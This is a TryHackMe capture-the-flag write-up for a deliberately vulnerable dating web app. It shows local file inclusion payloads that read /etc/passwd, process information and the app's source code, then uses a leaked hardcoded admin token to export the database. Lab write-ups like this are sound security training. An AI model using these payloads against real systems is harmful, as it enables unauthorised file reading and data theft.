# Valenfind - TryHackMe-writeup

Difficulty: Medium

Description: Can you find vulnerabilities in this new dating app?

Objective: Exploit the web application to retrieve the hidden database and the flag.

# Phase 1: Enumeration & Discovery
Upon navigating to the target IP (http://TARGET_IP:5000), I registered a new account to access the dashboard. The application is a dating site featuring several profiles.

## One profile stood out: Cupid.

Observation: Cupid has over 1,000 likes.

## Clue: The bio suggests that the creator is a novice and the database is "hidden" somewhere on the server.

While inspecting the network traffic and source code on Cupid's profile page, I discovered a hint in the JavaScript comments:
``` html
// Vulnerability: 'layout' parameter allows LFI fetch('/api/fetch_layout?layout=${layoutName}')
```
# Identifying the Vulnerability
The layout parameter fetches files from the backend. I tested for Local File Inclusion (LFI) by attempting to read the system's /etc/passwd file.

Payload:
```bash
http://TARGET_IP:5000/api/fetch_layout?layout=/etc/passwd
```
The server responded with the contents of the passwd file, confirming the vulnerability.

# Phase 2: Source Code Analysis
To find the application logic, I checked 
``` bash
/proc/self/cmdline
```
 to see how the Flask server was started.

Payload:
```
http://TARGET_IP:5000/api/fetch_layout?layout=/proc/self/cmdline
```
The output revealed the application path: 
``` html
/usr/bin/python3 /opt/Valenfind/app.py
```
Using the LFI vulnerability again, I read the source of app.py.
Payload:
```
http://TARGET_IP:5000/api/fetch_layout?layout=/opt/Valenfind/app.py
```
## Key Findings in app.py:
Hardcoded Admin Key:
``` html
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```
Protected Admin Endpoint:
``` python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        return send_file(DATABASE, as_attachment=True)
```
The endpoint /api/admin/export_db requires a specific header: X-Valentine-Token
# Phase 3: Exploitation
With the ADMIN_API_KEY and the required header name, just send this payload using Burp Suite
```bash
GET /api/admin/export_db
```
and add this X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
and you can have your flag
